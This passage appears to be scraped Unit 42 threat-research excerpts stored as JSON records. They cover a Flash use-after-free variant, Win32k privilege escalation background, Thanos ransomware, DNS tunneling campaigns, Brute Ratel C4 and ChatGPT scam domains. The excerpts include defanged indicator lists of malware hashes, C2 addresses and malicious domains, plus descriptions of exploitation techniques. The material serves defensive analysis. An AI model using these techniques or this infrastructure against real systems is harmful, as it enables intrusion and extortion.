so:\nFor Flash versions 13.0.0.250 and above, but older than 13.0.0.269, and for Flash versions 15.0.0.189 and above, but older than 16.0.0.305,CVE-2015-0313 is used.The description of CVE-2015-0313states the following:\n\"Use-after-free vulnerability in Adobe Flash Player before 13.0.0.269 and 14.x through 16.x before 16.0.0.305 on Windows ...\"\nIf the Flash version is 13.0.0.277 or 17.0.0.134, a different exploit (trigger) is used. This is the only line where the exploitation paths differ from each other, so if it had indeed been CVE-2015-0359, we would expectits descriptionto look like the one for CVE-2015-0313. However, this is the description that appears instead:\n\"Double free vulnerability in Adobe Flash Player before 13.0.0.281 and 14.x through 17.x before 17.0.0.169 on Windows ...\"\nWe can say with confidence that this not CVE-2015-0359. This is probably ause-after-free (UAF) vulnerability, and not a double-free vulnerability (see the Technical Analysis section for actual proof). We therefore call this vulnerability CVE-2015-X.\nThis is the timeline of events for CVE-2015-X:\nFebruary 2:CVE-2015-0313 is discoveredas a 0-day exploited in the wild. \nFeburary 4/5:Adobe releases patched versions for CVE-2015-0313for automatic/manual download. The patched version is 16.0.0.305, andit also stops CVE-2015-X. \nFebruary 25: A fully workingexploit code for CVE-2015-0313is published. A change ofonly a handful of code lineswould create CVE-2015-X. \nMarch 12:Flash Player 17.0.0.134 is released. It isvulnerable to CVE-2015-X. \nApril 14: Flash Player 17.0.0.169 is released,fixing both CVE-2015-0359 and CVE-2015-X.\nThis timeline suggests that attackers had a whole month to easily create and use CVE-2015-X against Flash Player 17.0.0.134,as a 0-day exploit. Both the attacks on CVE-2015-0313 and on CVE-2015-X were stopped byPalo Alto Networks Trapsat the early exploitation stages, without causing any harm to the machine or to the organization. Prevention occurred without having any prior knowledge on the vulnerabilities or the attacks.\nHaving understood the gravity of the situation, and since there are at least a couple of almost-identical exploits that trigger \"different\" vulnerabilities, we would now like to understand the root cause of these vulnerabilities. Read on for a deep technical analysis, showing the root cause of these vulnerabilities and the vulnerability triggering flow.", "source": "Palo"}, {"title": "Summary", "content": "The above is a detailed analysis of the root cause of the CVE-2015-X vulnerability, as well as a step-by-step explanation of how to trigger it. More importantly, we shared insights on workers, and suggested that there might be other paths leading to vulnerabilities of similar nature.\nWe note that the patches and code changes that prevented CVE-2015-0313 from being exploited did not actually address the root cause itself, which is exactly the same as in CVE-2015-X: deleting the subscribers' information from the worker's view of the byte array. This left the path open for exploitation of CVE-2015-X, a vulnerability based on the exact same bug. This exploitation indeed soon revealed itself.\nLikewise, there may be similar vulnerabilities still lurking out there, perhaps even having to do with the exact same root cause. DeployingPalo Alto Networks Trapsin your organization protects you from existing and future exploitation of applications, including in Flash.", "source": "Palo"}, {"title": "Introduction", "content": "In late January 2022, several reports on social media indicated that a new Microsoft Windows privilege escalation vulnerability (CVE-2022-21882) was being exploited in the wild. These reports prompted us to do an analysis of CVE-2022-21882, which turned out to be a vulnerability in the Win32k.sys user-mode callback functionxxxClientAllocWindowClassExtraBytes.\nIn 2021, a very similar vulnerability (CVE-2021-1732) was reported to \u2013 and patched by \u2013 Microsoft. We decided to take a closer look at both vulnerabilities to better understand the code involved in each. In our initial analysis we wanted to determine why the patch for CVE-2021-1732 was not sufficient to prevent CVE-2022-21882.\nThis is part one of a series that will cover Win32k internals and exploitation in general using these two vulnerabilities and their related proof-of-concept (PoC) exploits as examples.\nHere, we cover a significant amount of background information, including years worth of background research, conducted by several excellent researchers, to get the reader up to date to the latest implementations of Win32k and its associated exploitation methodologies. For an even deeper understanding of the subject, we also recommend reading all of the linked references at the end of the post.\nBoth vulnerabilities discussed in this series are detected and blocked by the Cortex XDR Anti-LPE protection module. Both vulnerabilities are data-only exploits that copy the NT/Authority System privilege token to that of the current (exploit) process for privilege escalation. The XDR Anti-LPE modules monitor for this specific type of privilege escalation technique.", "source": "Palo"}, {"title": "Introduction", "content": "Quite a lot has been written on Windows development via the Win32 API, and Windows internals. However, in our experience, very few security-related sources cover development via the graphical user interface (GUI) or its underlying internals. This interface is implemented withinWin32k.sys,Win32kbase.sysandWin32kfull.sys.\nTherefore, we decided to do some research to get better acquainted with the Windows GUI internals and associated APIs. We read a few whitepapers on Win32k exploitation written over the past 10 years or so, as well as the Microsoft Developer Network (MSDN) documentation on the Win32API.\nWe don't want to assume any level of expertise with the underlying code involved. Therefore, to ease the understanding of the two vulnerabilities being analyzed as well as otherWin32k.sysvulnerabilities and exploits, in our first post we will cover some background on the relevant APIs, objects and data structures involved.\nBecause exploitation of these vulnerabilities and the patch bypass method was relatively easy to understand, we chose these two recent examples to walk through some of the Win32k internals to help people understand how they are commonly leveraged to obtain read/write primitives. It also provides us with a good opportunity to discuss common Win32k exploit targets (user-mode callbacks) within theWin32k.syscodebase.", "source": "Palo"}, {"title": "Background", "content": "Prior to Windows NT 4.0, Microsoft implemented the GUI functionalities of the Win32 API within a user-mode process called theClient-Server Runtime SubSystem(CSRSS.exe). However, context switches between user-mode and kernel-mode were computationally expensive and required large memory overhead.\nTo eliminate these issues and speed up the overall Windows operating system, Microsoft decided to move the Windows subsystem (Window Manager, GDI and graphics drivers) to the kernel. This transition started with Windows NT 4.0 in 1996.\nThis change was implemented through a kernel-mode driver calledWin32k.sys, in what is now known as the kernel-mode Windows subsystem. The user-mode component of the Windows subsystem still resides within CSRSS.\nAlthough the move to the kernel greatly reduced the overhead required, Microsoft had to resort to some old tricks, such as caching management data structures within the user-mode portion of the client's address space. In fact, to further avoid context switches, some management structures have historically been stored exclusively in user-mode. However, in an effort to eliminate kernel address leaks, Microsoft has started to implement methods that use user-mode and kernel-mode copies of these structures to prevent kernel addresses from being stored in user-mode structures.\nAdditionally, because Win32k needed a way to access these user-mode structures and support some existing user-mode functionality such as window hooking, user-mode callbacks were implemented to facilitate these tasks.\n\"User-mode callbacks allow Win32k to make calls back into user-mode and perform tasks such as invoking application-de\ufb01ned hooks, providing event noti\ufb01cations, and copying data to/from user-mode,\"Tarjei Mandt wrote in a detailed whitepaper. His research was also presented at Black Hat USA in 2011. In doing so, he demonstrated the challenges Microsoft faced in implementing user-mode callbacks and preserving data integrity.\nMandt demonstrated that many objects were not being properly locked before making user-mode callbacks, which allowed user-mode code to destroy these objects during the user-mode callback, resulting in Use-After-Free (UAF) vulnerabilities. Although Microsoft has addressed many of the issues Mandt pointed out in 2011, user-mode callbacks are still abused today.\nInspired by Mandt's research, in 2019Gil Dabah wrote a paperbuilding upon Mandt's research. He discovered that even if user-mode code destroys objects that are correctly locked during user-mode callbacks, the destroyed objects can have secondary effects on other objects that are not locked correctly. This activity resulted in secondary object destruction and further UAF vulnerabilities.", "source": "Palo"}, {"title": "Background", "content": "Before we discuss Win32k internals, we will briefly cover a simple C program that creates and destroys a window using the Win32 API. This will allow us to begin to understand how graphics windows are programmatically created and manipulated. It will also allow us to examine the underlying structures that define each window and their menus.\nWe'll be referring to the sample code in Figures 1-3 below to discuss the basics of window creation and the underlying structures used to define windows and menus. Comments have been added to the sample code to make it as understandable as possible.\nAs shown in Figure 1, the sample program starts off by defining a window class. A process must register a window class before it can create a window of the type defined within theWNDCLASSEXstructure. First a window class object is declaredWNDCLASSEX wcx = { }, then the window class structure is filled in.\nThe elements of the window class are as follows:\ncbSize: The size, in bytes, of this structure. Set this member tosizeof(WNDCLASSEX). \nstyle: The window class styles. This member can be any combination of theClass Styles. \nlpfnWndProc: Pointer to the function that processes all messages sent to windows in the class and defines the behavior of the window. Typically, the default window procedure is used for at least some messages. However, custom window procedures are often used to create unique window experiences. For more information, seeWindowProc. \ncbClsExtra: The number of extra bytes to allocate following the window-class structure. The system initializes the bytes to zero. \ncbWndExtra: The number of extra bytes to allocate following the window instance. The system initializes the bytes to zero. Do not confuse this withcbClsExtra, which is common to all windows of this window class. This is often 0, but when it's not, the memory is typically used to store data that is not constant across windows. We'll see this used in the PoC later. \nhInstance: A handle to the instance that contains the window procedure for the class. Identifies the application or .DLL that registered the class. Assigned thehinstanceargument toWinMainhere. \nhIcon: A handle to the class.LoadIcon(NULL, IDI_APPLICATION)loads the default icon. \nhCursor: A handle to the class cursor.LoadCursor(NULL, IDC_ARROW)loads the default cursor. \nhbrBackground: A handle to the class background brush.GetStockObject (WHITE_BRUSH)returns a handle to a white brush. The return value must be cast becauseGetStockObjectreturns a generic object. \nlpszMenuName: Pointer to a null-terminated character string that specifies the resource name of the class menu, as the name appears in the resource file. If no menu bar is needed, this field can beNULL. \nlpszClassName: The class name that identifies this window class structure. \nhIconSm: A handle to the small class icon.\nNow that the attributes of the window class have been defined, we need to register it with the application usingRegisterClassEx(), shown in Figure 2 below. On failure,RegisterClassEX()returns 0. Otherwise, it returns a class atom that uniquely identifies the class being registered. Registering the window class defines the class and its associated structure members to Windows.", "source": "Palo"}, {"title": "Conclusion", "content": "In our first installment of this series, we've covered using the Win32 API to create GUI objects such as windows and menus. We covered the user-mode and kernel-mode data structures that are used to manage these objects and how they have changed over the years to help optimize and secure the transition between user-mode and kernel-mode.\nIn ournext post, we'll walk through a PoC for CVE-2022-21882 and explain what the code is doing. Finally, we'll discuss the vulnerability, how it's used to elevate privileges, and why the patch for CVE-2021-1732 wasn't sufficient to prevent CVE-2022021882.\nBoth vulnerabilities discussed in this series are detected and blocked by theCortex XDRAnti-LPE protection module. The XDR Anti-LPE modules monitor for techniques such as these that are data-only exploits, which copy the NT/Authority System privilege token to that of the current process for privilege escalation.", "source": "Palo"}, {"title": "Introduction", "content": "On July 6 and July 9, 2020, we observed files associated with an attack on two state-run organizations in the Middle East and North Africa that ultimately installed and ran a variant of the Thanos ransomware. The Thanos variant created a text file that displayed a ransom message requesting the victim transfer \"20,000$\" into a specified Bitcoin wallet to restore the files on the system. We do not have visibility into the overall impacts of these attacks or whether or not the threat actors were successful in receiving a payment from the victims.\nFigure 1. Thanos' ransom note displayed after encrypting files.\nThe ransomware was also configured to overwrite the master boot record (MBR), which is an important component loaded on a system's hard drive that is required for the computer to locate and load the operating system. The ransomware overwrites the MBR to display the same ransom message as the previously mentioned text file, which is a technique we do not see often. The most notable example we've observed involved thePetya ransomwarein 2017. Overwriting the MBR is a more destructive approach to ransomware than usual. Victims would have to expend more effort to recover their files \u2013 even if they paid the ransom. Fortunately, in this case, the code responsible for overwriting the MBR caused an exception because the ransom message contained invalid characters, which left the MBR intact and allowed the system to boot correctly. This means that even though the ransomware was configured to overwrite the MBR, the threat actors were unsuccessful in causing the computers they infected with the Thanos ransomware not to boot.\nFigure 2. Thanos' ransom note displayed if MBR overwrite was successful.\nThe Thanos ransomware was first discussed byRecorded Futurein February 2020 when it was advertised for sale on underground forums. The Thanos ransomware has a builder that allows actors to customize the sample with a variety of available settings. The fact Thanos is for sale suggests the likelihood of multiple threat actors using this ransomware. However, we believe with high confidence that the same actor used a Thanos variant in attacks on two state-run organizations in the Middle East and North Africa.\nBased on our telemetry, we first observed Thanos on Jan. 13, 2020, and have seen over 130 unique samples since. We believe the threat actors had prior access to these organizations' networks, as the samples contained credentials that we believe the actors had stolen from systems on these organizations' networks prior to the delivery of the ransomware.\nThis particular attack involved multiple layers of PowerShell scripts, inline C# code and shellcode in order to load Thanos into memory and to run it on the local system. These layers were largely based on code freely available in open source frameworks, such asSharp-SuiteandDonut. One of the layers involved a custom PowerShell that was responsible for spreading Thanos to other systems on the local network using previously mentioned stolen credentials.\nWe analyzed this specific Thanos sample that the actors built for the Middle Eastern and Northern African state-run organizations. We determined that the ransomware was loaded into and run from within memory at these organizations. We found the Thanos variant is functionally very similar to the variant discussed byFortinet in July 2020. The sample analyzed by Fortinet also contained network-spreading functionality enabled, which included network credentials from another state-run organization in the same municipality as the Middle Eastern state-run organization we observed. The sample analyzed by Fortinet included the same Bitcoin wallet and contact email that we observed. When combined with the targeting of an organization in the same municipality in a similar time frame, this suggests a common actor behind these attacks.\nPalo Alto Networks customers are protected from the attacks discussed in this blog byWildFire, which correctly identifies all related samples as malicious, andCortex XDR, which blocks the components involved in this ransomware infection.", "source": "Palo"}, {"title": "Conclusion", "content": "Actors used the Thanos ransomware to encrypt files and a PowerShell script to spread to additional systems, specifically on networks of two state-run organizations in the Middle East and North Africa. The Thanos variant created a text file that displayed a ransom message requesting the victim transfer \"20,000$\" into a specified Bitcoin wallet to restore the files on the system.\nWhile the Thanos ransomware is not new, it appears that it is still under active development as the variant used in these attacks contained new functionality. The new functionality included the ability to detect and evade more analysis tools, the enumeration of local storage volumes via a technique used by the Ragnar Locker ransomware and a new capability to monitor for newly attached storage devices.\nMost importantly, this variant of Thanos also included the new ability to overwrite the MBR and display the same ransom message. Overwriting the MBR is a much more destructive approach to ransomware than previously used by Thanos and would require more effort for victims to recover their files even if they paid the ransom.\nPalo Alto Networks customers are protected from the attacks discussed in this blog in the following ways:\nAll known Thanos ransomware and LogicalDuckBill samples have malicious verdicts inWildFire. \nAutoFocus customers can track this ransomware, PowerShell spreading script and the potentially related downloader with the tagsThanos,LogicalDuckBillandPowGoop. \nCortex XDRblocks Thanos ransomware, LogicalDuckBill and PowGoop.", "source": "Palo"}, {"title": "Indicators", "content": "40890a1ce7c5bf8fda7bd84b49c577e76e0431e4ce9104cc152694fc0029ccbf\n06d5967a6b90b5b5f6a24b5f1e6bfc0fc5c82e7674817644d9c3de61008236dc\ncbb95952001cdc3492ae8fd56701ceff1d1589bcfafd74be86991dc59385b82d\n240e3bd7209dc5151b3ead0285e29706dff5363b527d16ebcc2548c0450db819\n7aa46a296fbebdf3b13d399bf0dbe6e8a8fbcbc9ba696e5698326494b0da2e5458bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f\nc460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850\nae66e009e16f0fad3b70ad20801f48f2edb904fa5341a89e126a26fd3fc80f75\n5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d\nb60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 (legitimate Google installer, GoogleUpdate.exe)\ndea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e (legitimate Google DLL, goopdate86.dll)\na224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 (PowGoop Loader, goopdate.dll)\nb7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e PowGoop Downloader, config.dat)\n107.174.241[.]175", "source": "Palo"}, {"title": "Introduction", "content": "This article reviews four previously undisclosed domain name system (DNS) tunneling campaigns that occurred in recent months. We identified these new campaigns through our recently deployed campaign monitoring system, which can identify new, potentially malicious campaigns from daily tunneling detection.\nDNS tunneling is a technique threat actors use to encode non-DNS traffic data within DNS packet traffic. This allows the information to bypass traditional network firewalls and establish covert communication channels for data exfiltration and infiltration.\nOur new campaign monitoring system is designed to detect tunneling domains based on the techniques and attributes commonly used in malicious campaigns. These unique intercorrelations among individual tunneling campaigns can reveal new tunneling domains.\nFor example, can attackers connect a new domain to any existing well-documented tunneling campaign? Do a couple of recently detected tunneling domains originate from an undisclosed campaign?\nHence, instead of investigating the tunneling domains individually, we seek to analyze these domains from the perspective of common attributes and quickly uncover new campaigns.\nWe have deployed this tunneling campaign monitoring system in ourAdvanced DNS Securityservice. This system allows organizations to secure their DNS traffic by identifying and blocking new potential campaigns from tunneling domains. It also provides detailed campaign information for customers who can log in to ourTest A Siteservice.\nPalo Alto NetworksNext-Generation Firewallcustomers can access the tunneling campaign information with theAdvanced DNS Securitysubscription and receive protections against malicious indicators (domains and IP addresses) mentioned in this article viaAdvanced URL Filtering. TheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research.\nTheNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the attacks with best practices by identifying the corresponding malware samples and command and control (C2) traffic.\nPalo Alto NetworksCortex Analyticscustomers receive protection against DNS tunneling techniques mentioned in this article via the DNS tunneling analytics detector.\nCortexalso helps protect against malware from the Hiloti family and others through features such as prevention for shellcode injection.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "The domains within each tunneling campaign share some common attributes, such as the following:\nInfrastructure \nDNS configurations \nPayload encoding \nDomain registration patterns \nAttack targets\nThese attributes enable us to identify significant clusters among the tunneling detection results so that we can discover the emerging tunneling campaigns.\nThis method of detection has revealed four new campaigns that we have described in this article and have named:\nFinHealthXDS \nRussianSite \n8NS \nNSfinder\nWe have implemented these techniques as a new campaign monitoring system into ourAdvanced DNS Securityservice, providing campaign information and descriptions to our customers. With this system, we have detected four new campaigns from daily tunneling detection results.\nTheNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the attacks with best practices via the following Threat Prevention signature:13033.\nCustomers can also receive protections against malicious indicators (domains, IP addresses) mentioned in this article viaAdvanced URL Filtering.\nTheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research.\nPalo Alto NetworksCortex Analyticscustomers receive protection against DNS tunneling techniques mentioned in this article via the DNS tunneling analytics detector.\nCortexalso helps protect against malware from the Hiloti family and others through features such as prevention for shellcode injection.\nIf you think you might have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "In this post, we share information about how security professionals can take analysis shortcuts to quickly triage and analyze multiple malware samples. Within minutes, we can determine the malware families from a group of samples, parse the embedded configuration and extract the associated network indicators of compromise (IoCs).\nFor example, earlier this year we quickly responded to requests for information related to cyberattacks against Ukrainian targets that used commercial attack tools likeQuasar RAT. From a single sample that one of our industry partners shared, we pivoted to a Bitbucket repository that contained 10 other samples belonging to the same threat actor.\nUsing malware configuration parsing at scale not only speeds up the analysis process but also reduces the need for manual reverse engineering of individual samples. Malware configuration extractors, available both commercially and in open-source projects, serve as exceptional tools for quickly obtaining answers when time is critical. Our results from Advanced WildFire's Malware Configuration Extraction (MCE) system indicate this approach is extremely useful to efficiently analyze large volumes of malware.\nPalo Alto Networks customers are better protected from the malware discussed in this article through ourNetwork Securitysolutions andCortexline of products, including Cortex XDR and XSIAM.Advanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Introduction", "content": "As malware analysts, we often find ourselves making tough choices related to time management. This is particularly true when protecting our customers in time-critical situations. Cybercriminals create an endless stream of malware with megabytes of irrelevant code and obfuscated payloads intentionally crafted to make our jobs harder and delay countermeasures.\nUsing MCE, we automated the extraction of configurations from multiple malware families to speed our analysis. These configurations consisted of various IoCs like command and control (C2) addresses, unique identifiers and attack parameters.", "source": "Palo"}, {"title": "Conclusion", "content": "This post reveals the importance of accelerating malware analysis, because we often have no time for individual analysis on large groups of malware samples. We encourage readers to use whatever tools you have available to accomplish this. Our examples from this article show how we use the MCE component of Advanced WildFire to save significant analysis time and focus on identifying related IoCs more efficiently.\nWith the analysis, we could quickly determine the malware families of our newly discovered samples.\nQuicker analysis enhances our ability to detect, analyze and develop effective countermeasures against malicious software. Furthermore, by sharing this quickly gained information, we can collectively stay ahead of cybercriminals to help safeguard our digital systems and networks.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products:\nNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire, detect the files mentioned within this report as malicious. AdditionallyAdvanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious. \nCortex XDRandXSIAMcustomers are protected against the second-stage malware mentioned in the article. Cortex XDR detects and prevents these malware activities based onBehavioral Threat Prevention, AI-driven local analysis, analytics profiles and other security engines across Windows, Linux and Mac systems.\nIf you think you might have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 Hashes of the Second Stage Payloads\n50351b1ff64cd2e8d799f5153ff853a650e8782c49f241a123c8779ff3fa2a3d \n5b8e99a46d7c077152ef954e74a2ff1ad3de0adb34aa0b96f6f02fa60426d12f \nd69fe5cb1ded3aaa9a8b64824d820a72da0a1d43c9298cfcb5072f0060aefb8c \n04ec79fb6e3260c8db46aea8e5cc6a42ad6e2af1c7c0cf46866a06b4acb98bae \n504a6b8ce51c3be7de7e74c98c6da3fe12b186f634c441b43fa21f3350b7f1a3 \n101b9564ba11aa44372b37b1143eac0d5dd1e3f38c6a35517de843b9f23b3704 \n09df06e192569b671d8f4b7587a5ba184392e80195968d0e4f1ab0c21de65c5e \ne20124da608445d9df1c71b1ad3530331a86b773b0b2f6a43ad32ec3d061a297 \n564d742044e5ac9f6279c01c5c29bb801606b63c6c2cbfc2af09d8f2a73b84a6 \ne8af36287e2270581fd5f2d28c6e0b83b337f58d430554d28dbf55d2ca09fcca\nBeacon domains/IPs extracted:\n104.21.32[.]12 \n142.132.232[.]235 \n172.67.182[.]33 \n177.105.132[.]124 \n177.105.132[.]70 \n5.42.64[.]67 \n77.105.132[.]70 \n82.147.85[.]205 \nassaultseekwoodywod[.]pw \ncakecoldsplurgrewe[.]pw \nchincenterblandwka[.]pw \ndayfarrichjwclik[.]fun \ndiagramfiremonkeyowwa[.]fun \nhttp[:]//128.140.69[.]37:80 \nhttps[:]//steamcommunity[.]com/profiles/76561199588685141 \nneighborhoodfeelsa[.]fun \nopposesicknessopw[.]pw \nopposesicknessopw[.]pw \npinkipinevazzey[.]pw \npolitefrightenpowoa[.]pw \npolitefrightenpowoa[.]pw \nratefacilityframw[.]fun \nreviveincapablewew[.]pw", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 continuously hunts for new and unique malware samples that match known advanced persistent threat (APT) patterns and tactics. On May 19, one such sample was uploaded to VirusTotal, where it received a benign verdict from all 56 vendors that evaluated it. Beyond the obvious detection concerns, we believe this sample is also significant in terms of its malicious payload, command and control (C2), and packaging.\nThe sample contained a malicious payload associated withBrute Ratel C4(BRc4), the newest red-teaming and adversarial attack simulation tool to hit the market. While this capability has managed to stay out of the spotlight and remains less commonly known than itsCobalt Strikebrethren, it is no less sophisticated. Instead, this tool is uniquely dangerous in that it was specifically designed to avoid detection by endpoint detection and response (EDR) and antivirus (AV) capabilities. Its effectiveness at doing so can clearly be witnessed by the aforementioned lack of detection across vendors on VirusTotal.\nIn terms of C2, we found that the sample called home to an Amazon Web Services (AWS) IP address located in the United States over port 443. Further, the X.509 certificate on the listening port was configured to impersonate Microsoft with an organization name of \"Microsoft\" and organization unit of \"Security.\" Additionally, pivoting on the certificate and other artifacts, we identified a total of 41 malicious IP addresses, nine BRc4 samples, and an additional three organizations across North and South America who have been impacted by this tool so far.\nThis unique sample was packaged in a manner consistent with knownAPT29techniques and their recent campaigns, which leveraged well-known cloud storage and online collaboration applications. Specifically, this sample was packaged as a self-contained ISO. Included in the ISO was a Windows shortcut (LNK) file, a malicious payload DLL and a legitimate copy of Microsoft OneDrive Updater. Attempts to execute the benign application from the ISO-mounted folder resulted in the loading of the malicious payload as a dependency through a technique known as DLL search order hijacking. However, while packaging techniques alone are not enough to definitively attribute this sample to APT29, these techniques demonstrate that users of the tool are now applying nation-state tradecraft to deploy BRc4.\nOverall, we believe this research is significant in that it identifies not only a new red team capability that is largely undetectable by most cybersecurity vendors, but more importantly, a capability with a growing user base that we assess is now leveraging nation-state deployment techniques. This blog provides an overview of BRc4, a detailed analysis of the malicious sample, a comparison between the packaging of this sample and a recent APT29 sample, and a list of indicators of compromise (IoCs) that can be used to hunt for this activity.\nWe encourage all security vendors to create protections to detect activity from this tool and all organizations to be on alert for activity from this tool.\nPalo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Cortex XDR and WildFire malware analysis.\nFull visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in theUnit 42 ATOM viewer.", "source": "Palo"}, {"title": "Conclusion", "content": "The emergence of a new penetration testing and adversary emulation capability is significant. Yet more alarming is the effectiveness of BRc4 at defeating modern defensive EDR and AV detection capabilities.\nOver the past 2.5 years this tool has evolved from a part-time hobby to a full-time development project with a growing customer base. As this customer base has expanded into the hundreds, the tool has gained increased attention across the cybersecurity domain from both legitimate penetration testers as well as malicious cyber actors.\nThe analysis of the two samples described in this blog, as well as the advanced tradecraft used to package these payloads, make it clear that malicious cyber actors have begun to adopt this capability. We believe it is imperative that all security vendors create protections to detect BRc4 and that all organizations take proactive measures to defend against this tool.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nNote that the Microsoft name and logo shown are an attempt to impersonate a legitimate organization and do not represent an actual affiliation with Microsoft. This impersonation does not imply a vulnerability in Microsoft's products or services.", "source": "Palo"}, {"title": "Indicators", "content": "Brute Ratel C4 ISO Samples:\n1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C\nX64 Brute Ratel C4 Windows Kernel Module:\n31ACF37D180AB9AFBCF6A4EC5D29C3E19C947641A2D9CE3CE56D71C1F576C069\nAPT29 ISO Samples:\nF58AE9193802E9BAF17E6B59E3FDBE3E9319C5D27726D60802E3E82D30D14D46\nX64 Brute Ratel C4 Samples:\n3ED21A4BFCF9838E06AD3058D13D5C28026C17DC996953A22A00F0609B0DF3B93AD53495851BAFC48CAF6D2227A434CA2E0BEF9AB3BD40ABFE4EA8F318D37BBE973F573CAB683636D9A70B8891263F59E2F02201FFB4DD2E9D7ECBB1521DA03EDD8652E2DCFE3F1A72631B3A9585736FBE77FFABEE4098F6B3C48E1469BF27AAE1A9B35CF1378FDA12310F0920C5C53AD461858B3CB575697EA125DFEE829611EF9B60AA0E4179C16A9AC441E0A21DC3A1C3DC04B100EE487EABF5C5B1F571A6D71DC7BA8523947E08C6EEC43A726FE75AED248DFD3A7C4F6537224E9ED05F6F5887C4646E032E015AA186C5970E8F07D3ED1DE8DBFA298BA4522C89E547419B\nMalicious DLLs:\nEA2876E9175410B6F6719F80EE44B9553960758C7D0F7BED73C0FE9A78D8E669\nMalicious Encrypted Payloads:\nB5D1D3C1AEC2F2EF06E7D0B7996BC45DF4744934BD66266A6EBB02D70E35236E\nX.509 Cert SHA1s:\n55684a30a47476fce5b42cbd59add4b0fbc776a366aab897e33b3e4d940c51eba8d07f5605d5b275\nInfrastructure linked to X.509 Certs or Samples:\n104.6.92[.]229137.184.199[.]17138.68.50[.]218138.68.58[.]43139.162.195[.]169139.180.187[.]179147.182.247[.]103149.154.100[.]15115.206.84[.]52159.223.49[.]16159.65.186[.]50162.216.240[.]61172.105.102[.]247172.81.62[.]82174.129.157[.]251178.79.143[.]149178.79.168[.]110178.79.172[.]3518.133.26[.]24718.130.233[.]24918.217.179[.]818.236.92[.]31185.138.164[.]112194.29.186[.]67194.87.70[.]14213.168.249[.]2323.110.56[.]2193.133.7[.]6931.184.198[.]8334.195.122[.]22534.243.172[.]9035.170.243[.]21645.144.225[.]345.76.155[.]7145.79.36[.]19252.48.51[.]6752.90.228[.]20354.229.102[.]3054.90.137[.]21389.100.107[.]6592.255.85[.]17392.255.85[.]4494.130.130[.]43ds.windowsupdate.eu[.]org", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers are monitoring the trending topics, newly registered domains and squatting domains related to ChatGPT, as it is one of the fastest-growing consumer applications in history. The dark side of this popularity is that ChatGPT is also attracting the attention of scammers seeking to benefit from using wording and domain names that appear related to the site.\nBetween November 2022 through early April 2023, we noticed a 910% increase in monthly registrations for domains related to ChatGPT. In this same time frame, we observed a 17,818% growth of related squatting domains from DNS Security logs. We also saw up to 118 daily detections of ChatGPT-related malicious URLs captured from the traffic seen in our Advanced URL Filtering system.\nWe now present several case studies to illustrate the various methods scammers use to entice users into downloading malware or sharing sensitive information. As OpenAI released its official API for ChatGPT on March 1, 2023, we've seen an increasing number of suspicious products using it. Thus, we highlight the potential dangers of using copycat chatbots, in order to encourage ChatGPT users to approach such chatbots with a defensive mindset.\nPalo Alto Networks Next-Generation Firewall and Prisma Access customers withAdvanced URL Filtering,DNS SecurityandWildFiresubscriptions receive protections against ChatGPT-related scams. All mentioned malicious indicators (domains, IPs, URLs and hashes) are covered by these security services.", "source": "Palo"}, {"title": "Conclusion", "content": "The growing popularity of ChatGPT worldwide has made it a target for scammers. We have noticed a significant increase in the number of newly registered domains and squatting domains related to ChatGPT, which could potentially be exploited by scammers for malicious purposes.\nTo stay safe, ChatGPT users should exercise caution with suspicious emails or links related to ChatGPT. Moreover, the usage of copycat chatbots will bring extra security risks. Users should always access ChatGPT through the official OpenAI website.\nPalo Alto Networks Next-Generation Firewall and Prisma Access customers withAdvanced URL Filtering,DNS SecurityandWildFiresubscriptions are protected against ChatGPT-related scams. All the mentioned malicious indicators (domains, IPs, URLs and hashes) are covered by these security services.", "source": "Palo"}, {"title": "Indicators", "content": "Squatting Domains\nopenai[.]us \nopenai[.]xyz \nchatgpt[.]jobs\nChatGPT Scams\nchat-gpt-online-pc[.]com \nab68a3d42cb0f6f93f14e2551cac7fb1451a49bc876d3c1204ad53357ebf745f \npay[.]chatgpt-oracle[.]com 